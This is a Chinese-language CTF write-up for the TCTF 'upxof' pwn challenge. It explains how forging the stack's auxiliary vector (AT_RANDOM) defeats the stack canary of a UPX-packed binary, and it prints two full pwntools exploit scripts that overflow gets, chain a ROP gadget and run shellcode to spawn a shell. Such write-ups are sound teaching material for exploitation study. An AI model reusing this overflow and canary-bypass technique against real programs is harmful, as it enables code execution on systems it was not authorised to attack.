![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629379221450-a29618b9-a522-4a75-ae48-cf200984fd8b.png)

这里有个gets溢出，但是要考虑Canary的问题；由于Canary是使用AUXV中的AT_RAMDOM对应的值来初始化Canary的，所以我们可以篡改AT_RAMDOM的值来bypass Canary。然后我们得考虑如何拿到shell，看一下程序解密完之后的段情况（非手动脱壳后程序的段情况）：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629380467766-ada68586-07d4-4f44-a755-536dfa362150.png)

脱壳后的heap区是可以执行的，我们可以将shellcode写入这里，利用pwntools自带的shellcode就行了。还有一点需要注意的是伪造AUXV的过程，下面的内容是我一点一点尝试得出来的结论。

这里还是先回顾一下程序的辅助向量，无论是加壳的程序还是没有加壳的程序，当内核将程序初始化完成之后AUXV就已经push到用户的栈上：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629475432892-9878b3d2-ccde-491d-b9ee-7ecf99019c13.png)

如上图所示，这里我们可以套用python中键值对的概念，例如宏定义AT_BASE（键）对应的值为0x0，这里的值并不是指AT_BASE本身的值，而是这个宏定义所“对应”的值：

```c
typedef struct
{
  uint64_t a_type;		/* Entry type */
  union
    {
      uint64_t a_val;		/* Integer value */
      /* We use to have pointer elements added here.  We cannot do that,
	 though, since it does not work when using 32-bit definitions
	 on 64-bit platforms and vice versa.  */
    } a_un;
} Elf64_auxv_t;
```

并且“对应的值”并不是都是“值”，从狭义上来讲其中有一部分是“地址”也就是“指针”，如AT_RANDOM：

```python
AT_RANDOM                0x7fffffffe4d9 ◂— 0x4dd89e81fc0c30ab

```

0x7fffffffe4d9就是一个指针。所以我们在伪造的时候要注意有一小部分的辅助向量所对应的值是“指针”，我们不能随便给比如0xdeadbeef，否则会动态链接“库”时在ld.so中崩溃。

> AT_ENTRY、AT_PHDR、AT_RANDOM、AT_SYSINFO_EHDR对应的为指针，但是经过测试，除AT_RANDOM和AT_ENTRY之外的辅助向量他们都可以随便伪造，比如：p64(0xdeadbeef)、p64(0x0)
>

payload中伪造的AUXV顺序可以与原来程序的顺序不同，因为是根据a_type进行赋值的：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629477277855-c8b23717-ff1c-43b2-9e5c-60b32249fb6e.png)

还有，伪造的AUXV必须以NULL结尾，否则容易出错；其他需要注意的事项都在如下的脚本中：

```python
# coding:utf-8
from pwn import *
context.log_level = 'debug'
context.arch="amd64" #使用pwntools的shellcode一定要指定程序架构
context.terminal = ['tmux','splitw','-h']

p=process("./upxof")
elf=ELF("./unpack") #elf为脱壳后的程序
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")

'''
pwndbg> auxv
AT_BASE                  0x0
AT_CLKTCK                0x64
AT_EGID                  0x0
AT_ENTRY                 0x400988 ◂— sub    rsp, 0x80
AT_EUID                  0x0
AT_EXECFN                /root/Canary_User_Mode/ctf2/upxof
AT_FLAGS                 0x0
AT_GID                   0x0
AT_HWCAP                 0xf8bfbff
AT_NULL                  0x0
AT_PAGESZ                0x1000
AT_PHDR                  0x400040 ◂— add    dword ptr [rax], eax
AT_PHENT                 0x38
AT_PHNUM                 0x2
AT_PLATFORM              x86_64
AT_RANDOM                0x7fffffffe4d9 ◂— 0x78e1e590d18a1f34
AT_SECURE                0x0
AT_SYSINFO_EHDR          0x7ffff7ffd000 ◂— jg     0x7ffff7ffd047
AT_UID                   0x0
AT_UNKNOWN26             0x0
pwndbg> 
'''

fake_AT_BASE_key=7 
fake_AT_CLKTCK_key=17
fake_AT_EGID_key=14
fake_AT_ENTRY_key=9
fake_AT_EUID_key=12
fake_AT_EXECFN_key=31
fake_AT_FLAGS_key=8
fake_AT_GID_key=13
fake_AT_HWCAP_key=16
fake_AT_NULL_key=0
fake_AT_PAGESZ_key=6
fake_AT_PHDR_key=3
fake_AT_PHENT_key=4
fake_AT_PHNUM_key=5
fake_AT_PLATFORM_key=15
fake_AT_RANDOM_key=25
fake_AT_SECURE_key=23
fake_AT_SYSINFO_EHDR_key=33 
fake_AT_UID_key=11
fake_AT_UNKNOWN26_key=26

fake_AT_BASE_value=0x0
fake_AT_CLKTCK_value=0x64
fake_AT_EGID_value=0x0
fake_AT_ENTRY_value=0x400988
fake_AT_EUID_value=0x0
#fake_AT_EXECFN_value="/root/Canary_User_Mode/ctf2/upxof"
fake_AT_EXECFN_value=0xdeadbeef    #任意值，无需为指针
fake_AT_FLAGS_value=0x0
fake_AT_GID_value=0x0
fake_AT_HWCAP_value=0xf8bfbff
fake_AT_NULL_value=0x0
fake_AT_PAGESZ_value=0x1000
fake_AT_PHDR_value=0x400040
fake_AT_PHENT_value=0x38
fake_AT_PHNUM_value=0x2
#fake_AT_PLATFORM_value="x86_64"
fake_AT_PLATFORM_value=0xdeadbeef  #任意值，无需为有效指针
fake_AT_RANDOM_value=0x601100      #fake_canary：必须为有效指针，指针指向的值为canary
fake_AT_SECURE_value=0x0
fake_AT_SYSINFO_EHDR_value=0x7ffff7ffd000  #必须为有效指针，指针指向的值可以为0
fake_AT_UID_value=0x0
fake_AT_UNKNOWN26_value=0x0

fake_auxv=""
fake_auxv+=p64(fake_AT_SYSINFO_EHDR_key)+p64(fake_AT_SYSINFO_EHDR_value) #为了方便对照，这里采用与stack上AUXV相同的顺序
fake_auxv+=p64(fake_AT_HWCAP_key)+p64(fake_AT_HWCAP_value)               
fake_auxv+=p64(fake_AT_PAGESZ_key)+p64(fake_AT_PAGESZ_value)
fake_auxv+=p64(fake_AT_CLKTCK_key)+p64(fake_AT_CLKTCK_value)
fake_auxv+=p64(fake_AT_PHDR_key)+p64(fake_AT_PHDR_value)
fake_auxv+=p64(fake_AT_PHENT_key)+p64(fake_AT_PHENT_value)
fake_auxv+=p64(fake_AT_PHNUM_key)+p64(fake_AT_PHNUM_value)
fake_auxv+=p64(fake_AT_BASE_key)+p64(fake_AT_BASE_value)
fake_auxv+=p64(fake_AT_FLAGS_key)+p64(fake_AT_FLAGS_value)
fake_auxv+=p64(fake_AT_ENTRY_key)+p64(fake_AT_ENTRY_value)
fake_auxv+=p64(fake_AT_UID_key)+p64(fake_AT_UID_value)
fake_auxv+=p64(fake_AT_EUID_key)+p64(fake_AT_EUID_value)
fake_auxv+=p64(fake_AT_GID_key)+p64(fake_AT_GID_value)
fake_auxv+=p64(fake_AT_EGID_key)+p64(fake_AT_EGID_value)
fake_auxv+=p64(fake_AT_SECURE_key)+p64(fake_AT_SECURE_value)
fake_auxv+=p64(fake_AT_RANDOM_key)+p64(fake_AT_RANDOM_value)
fake_auxv+=p64(fake_AT_UNKNOWN26_key)+p64(fake_AT_UNKNOWN26_value)
fake_auxv+=p64(fake_AT_EXECFN_key)+p64(fake_AT_EXECFN_value)
fake_auxv+=p64(fake_AT_PLATFORM_key)+p64(fake_AT_PLATFORM_value)
fake_auxv+=p64(0)*2              #auxv需要以NULL（AT_NULL）结尾，给一个p64(0)即可

fake_argc=p64(0x1)               #在写入shellcode之前，地址0x601100存放的值为零
fake_argv=p64(0x601100)+p64(0)   #必须为有效指针，指针指向的值可以为0
fake_envp=p64(0x601100)*28+p64(0)#必须为有效指针，指针指向的值可以为0
                                 #envp在原内存中有28个成员(以\x00结尾)，但这不是固定的，在伪造时可以为任意数量
                                 #只要别太离谱就行（感兴趣可以自己分析分析）

payload1='12345678'+p64(0)*14+fake_argc+fake_argv+fake_envp+fake_auxv #“12345678”过password验证
p.recvuntil("password:")
#gdb.attach(proc.pidof(p)[0]) 
p.sendline(payload1)

shellcode=asm(shellcraft.sh())
pop_rdi_gadget=0x4007f3 #需为壳后的地址
shellcode_mem=0x601100  #heap段可执行
gets_plt_addr=elf.plt['gets'] #elf为脱壳后的程序
payload2='a'*0x408+p64(0)+p64(0xdeadbeef)+p64(pop_rdi_gadget)+p64(shellcode_mem)+p64(gets_plt_addr)+p64(shellcode_mem) #canary、rbp
p.recvuntil("let's go:")
p.sendline(payload2)
sleep(1)
p.sendline(shellcode)
p.interactive()
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629477817241-7110f1c2-9acf-435c-8246-21672d04db8d.png)

其实，其中一大部分的辅助向量都是可以不用伪造的：

```python
# coding:utf-8
from pwn import *
context.log_level = 'debug'
context.arch="amd64"
context.terminal = ['tmux','splitw','-h']

p=process("./upxof")
elf=ELF("./unpack") #elf为脱壳后的程序
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")

'''
pwndbg> auxv
AT_BASE                  0x0
AT_CLKTCK                0x64
AT_EGID                  0x0
AT_ENTRY                 0x400988 ◂— sub    rsp, 0x80
AT_EUID                  0x0
AT_EXECFN                /root/Canary_User_Mode/ctf2/upxof
AT_FLAGS                 0x0
AT_GID                   0x0
AT_HWCAP                 0xf8bfbff
AT_NULL                  0x0
AT_PAGESZ                0x1000
AT_PHDR                  0x400040 ◂— add    dword ptr [rax], eax
AT_PHENT                 0x38
AT_PHNUM                 0x2
AT_PLATFORM              x86_64
AT_RANDOM                0x7fffffffe4d9 ◂— 0x78e1e590d18a1f34
AT_SECURE                0x0
AT_SYSINFO_EHDR          0x7ffff7ffd000 ◂— jg     0x7ffff7ffd047
AT_UID                   0x0
AT_UNKNOWN26             0x0
pwndbg> 
'''

fake_AT_BASE_key=7 
fake_AT_CLKTCK_key=17
fake_AT_EGID_key=14
fake_AT_ENTRY_key=9
fake_AT_EUID_key=12
fake_AT_EXECFN_key=31
fake_AT_FLAGS_key=8
fake_AT_GID_key=13
fake_AT_HWCAP_key=16
fake_AT_NULL_key=0
fake_AT_PAGESZ_key=6
fake_AT_PHDR_key=3
fake_AT_PHENT_key=4
fake_AT_PHNUM_key=5
fake_AT_PLATFORM_key=15
fake_AT_RANDOM_key=25
fake_AT_SECURE_key=23
fake_AT_SYSINFO_EHDR_key=33 
fake_AT_UID_key=11
fake_AT_UNKNOWN26_key=26

fake_AT_BASE_value=0x0
fake_AT_CLKTCK_value=0x64
fake_AT_EGID_value=0x0
fake_AT_ENTRY_value=0x400988
fake_AT_EUID_value=0x0
#fake_AT_EXECFN_value="/root/Canary_User_Mode/ctf2/upxof"
fake_AT_EXECFN_value=0xdeadbeef    #任意值，无需为指针
fake_AT_FLAGS_value=0x0
fake_AT_GID_value=0x0
fake_AT_HWCAP_value=0xf8bfbff
fake_AT_NULL_value=0x0
fake_AT_PAGESZ_value=0x1000
fake_AT_PHDR_value=0x400040
fake_AT_PHENT_value=0x38
fake_AT_PHNUM_value=0x2
#fake_AT_PLATFORM_value="x86_64"
fake_AT_PLATFORM_value=0xdeadbeef  #任意值，无需为有效指针
fake_AT_RANDOM_value=0x601100      #fake_canary：必须为有效指针，指针指向的值为canary
fake_AT_SECURE_value=0x0
fake_AT_SYSINFO_EHDR_value=0x7ffff7ffd000  #必须为有效指针，指针指向的值可以为0
fake_AT_UID_value=0x0
fake_AT_UNKNOWN26_value=0x0

fake_auxv=""
#fake_auxv+=p64(fake_AT_SYSINFO_EHDR_key)+p64(fake_AT_SYSINFO_EHDR_value) #为了方便对照，这里采用与stack上AUXV相同的顺序
#fake_auxv+=p64(fake_AT_HWCAP_key)+p64(fake_AT_HWCAP_value)               
#fake_auxv+=p64(fake_AT_PAGESZ_key)+p64(fake_AT_PAGESZ_value)
#fake_auxv+=p64(fake_AT_CLKTCK_key)+p64(fake_AT_CLKTCK_value)
fake_auxv+=p64(fake_AT_PHDR_key)+p64(fake_AT_PHDR_value)
fake_auxv+=p64(fake_AT_PHENT_key)+p64(fake_AT_PHENT_value)
fake_auxv+=p64(fake_AT_PHNUM_key)+p64(fake_AT_PHNUM_value)
#fake_auxv+=p64(fake_AT_BASE_key)+p64(fake_AT_BASE_value)
#fake_auxv+=p64(fake_AT_FLAGS_key)+p64(fake_AT_FLAGS_value)
fake_auxv+=p64(fake_AT_ENTRY_key)+p64(fake_AT_ENTRY_value)
#fake_auxv+=p64(fake_AT_UID_key)+p64(fake_AT_UID_value)
#fake_auxv+=p64(fake_AT_EUID_key)+p64(fake_AT_EUID_value)
#fake_auxv+=p64(fake_AT_GID_key)+p64(fake_AT_GID_value)
#fake_auxv+=p64(fake_AT_EGID_key)+p64(fake_AT_EGID_value)
#fake_auxv+=p64(fake_AT_SECURE_key)+p64(fake_AT_SECURE_value)
fake_auxv+=p64(fake_AT_RANDOM_key)+p64(fake_AT_RANDOM_value)
#fake_auxv+=p64(fake_AT_UNKNOWN26_key)+p64(fake_AT_UNKNOWN26_value)
#fake_auxv+=p64(fake_AT_EXECFN_key)+p64(fake_AT_EXECFN_value)
#fake_auxv+=p64(fake_AT_PLATFORM_key)+p64(fake_AT_PLATFORM_value)
fake_auxv+=p64(0)*2              #auxv需要以NULL（AT_NULL）结尾，给一个p64(0)即可

fake_argc=p64(0x1)               #在写入shellcode之前，地址0x601100存放的值为零
fake_argv=p64(0x601100)+p64(0)   #必须为有效指针，指针指向的值可以为0
fake_envp=p64(0x601100)*28+p64(0)#必须为有效指针，指针指向的值可以为0
                                 #envp在原内存中有28个成员(以\x00结尾)，但这不是固定的，在伪造时可以为任意数量
                                 #只要别太离谱就行（感兴趣可以自己分析分析）
payload1='12345678'+p64(0)*14+fake_argc+fake_argv+fake_envp+fake_auxv #“12345678”过password验证
p.recvuntil("password:")
#gdb.attach(proc.pidof(p)[0]) 
p.sendline(payload1)

shellcode=asm(shellcraft.sh())
pop_rdi_gadget=0x4007f3 #需为壳后的地址
shellcode_mem=0x601100  #heap段可执行
gets_plt_addr=elf.plt['gets'] #elf为脱壳后的程序
payload2='a'*0x408+p64(0)+p64(0xdeadbeef)+p64(pop_rdi_gadget)+p64(shellcode_mem)+p64(gets_plt_addr)+p64(shellcode_mem) #canary、rbp
p.recvuntil("let's go:")
p.sendline(payload2)
sleep(1)
p.sendline(shellcode)
p.interactive()
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629477970232-6cb33d39-f541-4175-b4cc-c0b6dd03e5a3.png)

只要记得如下5个成员和对应的值伪造即可：AT_PHDR、AT_PHENT、AT_PHNUM 、AT_ENTRY 0x9、AT_RANDOM，这里就不探究原因了，感兴趣的话可以自己分析。

### 疑难解答
Q：为什么不能在第一次输入时写入shellcode？

A：因为溢出后无法劫持程序流。

Q：为什么AT_RANDOM的指针中所存放的值可以为0x0？不是说为0x0会导致Canary为一个固定值吗？

A：仔细看脚本中伪造的为指向内容为0的非空指针，glibc源码中说的是当_dl_random为空指针时Canary为一个固定值；

Q：我可以让Canary为一个固定值吗，也就是让_dl_random为空指针？

A：很抱歉，不可以；若_dl_random为空指针，会导致段错误：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629479909963-c7236dc4-8640-4e68-a777-a43845552ed6.png)

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629479942120-263dffd0-e2de-4d02-bd9e-08c710079ce5.png)

经研究汇编代码发现，其中似乎在执行的时候并不会判断_dl_random为空：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629526686240-5b244d2a-aa30-47bf-8bd6-8d6838c826df.png)

暂不清楚是不是glibc编译的一个bug。

Q：为什么说UPX壳是此题目的关键?

A：因为在未执行混淆的代码之前，有栈溢出可以篡改AUXV；在执行混淆代码时拥有rwx段可以执行shellcode。

# 有关这篇文章的相关资料
```c
https://thinkycx.me/2019-02-17-how-does-canary-generates.html
https://hardenedlinux.github.io/2016/11/27/canary.html
https://ctf-wiki.org/pwn/linux/user-mode/mitigation/canary/#canary_2
https://mp.weixin.qq.com/s?srcid=0811GZU8d13pHFHk5RZXi2Ir&scene=23&sharer_sharetime=1628614977528&mid=2458302417&sharer_shareid=817300ea833ed8fde6b3dcafc70d83f3&sn=189c0270caee22c06e86937b2de6f19c&idx=3&__biz=MjM5NTc2MDYxMw%3D%3D&chksm=b181875b86f60e4dc1bf0a895605e2b676ab7022c82e393e612389396b652f263585971d356a&mpshare=1#rd
https://www.elttam.com/blog/playing-with-canaries/#content
http://phrack.org/issues/58/5.html
https://github.com/pcy190/learn_pwn/blob/master/canary/2017-TCTF-Final-pwn-upxof/shell.py
https://www.cnblogs.com/countfatcode/p/11796476.html
http://uprprc.net/2018/04/15/canary-in-glibc.html
https://www.dazhuanlan.com/leehom5/topics/1168642
https://www.dazhuanlan.com/seedtest/topics/1661377
https://zhakul.top/2019/03/19/Glibc%E4%B8%ADcanary%E7%9A%84%E5%AE%9E%E7%8E%B0/
https://qianfei11.github.io/2019/02/15/%E7%BB%95%E8%BF%87ELF%E7%9A%84%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E6%9C%BA%E5%88%B6Canary/#JarvisOJ-Smashes
https://www.cnblogs.com/xiaofool/p/5394856.html
https://kirin-say.top/2019/02/26/The-Way-to-Bypass-Canary/#%E5%A4%9A%E7%BA%BF%E7%A8%8B-gt-SSP-LEAK
https://jontsang.github.io/post/34550.html
https://ble55ing.github.io/2019/07/01/starctf2018-babystack/
https://www.ascotbe.com/2021/03/26/StackOverflow_Linux_0x03/
https://blog.csdn.net/qq_52126646/article/details/119495466
https://donald-zhuang.github.io/2018/07/21/Tips-About-Canary-in-GCC-SSP/
https://www.mi1k7ea.com/2019/05/24/GOT%E8%A1%A8-PLT%E8%A1%A8%E4%B8%8E%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/
https://www.cnblogs.com/LittleHann/p/4275966.html
```

